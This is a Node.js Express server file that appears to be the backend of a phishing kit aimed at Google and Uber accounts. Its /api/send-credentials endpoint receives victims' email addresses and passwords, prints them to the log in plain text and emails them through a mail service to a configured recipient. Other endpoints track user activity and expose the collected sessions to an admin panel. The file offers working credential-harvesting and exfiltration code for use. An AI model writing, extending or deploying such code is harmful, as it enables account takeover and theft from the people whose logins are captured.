import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import { sendCredentialsEmail } from './emailService.js';

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());

// Store activities in memory (no database)
let activities = [];

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

// Send credentials endpoint
app.post('/api/send-credentials', async (req, res) => {
  try {
    const { googleEmail, googlePassword, uberEmail, uberPassword } = req.body;
    
    console.log('\n=== API: Received credentials ===');
    console.log('Google Email:', googleEmail);
    console.log('Google Password:', googlePassword);
    console.log('Uber Email:', uberEmail);
    console.log('Uber Password:', uberPassword);
    
    await sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword);
    
    res.json({ success: true, message: 'Credentials sent successfully' });
  } catch (error) {
    console.error('Error sending credentials:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Track activity endpoint
app.post('/api/track-activity', (req, res) => {
  try {
    const activityData = {
      ...req.body,
      id: `activity_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      receivedAt: new Date().toISOString(),
    };
    
    activities.push(activityData);
    
    // Keep only last 1000 activities
    if (activities.length > 1000) {
      activities = activities.slice(-1000);
    }
    
    console.log('Activity tracked:', activityData.action, activityData.target);
    
    res.json({ success: true, message: 'Activity tracked' });
  } catch (error) {
    console.error('Error tracking activity:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get sessions endpoint (for admin panel)
app.get('/api/get-sessions', (req, res) => {
  try {
    res.json({ success: true, activities });
  } catch (error) {
    console.error('Error fetching activities:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`\n🚀 Server running on http://localhost:${PORT}`);
  console.log(`📧 Email service configured with: ${process.env.GMAIL_USER}`);
  console.log(`📬 Sending emails to: ${process.env.RECIPIENT_EMAIL}\n`);
});
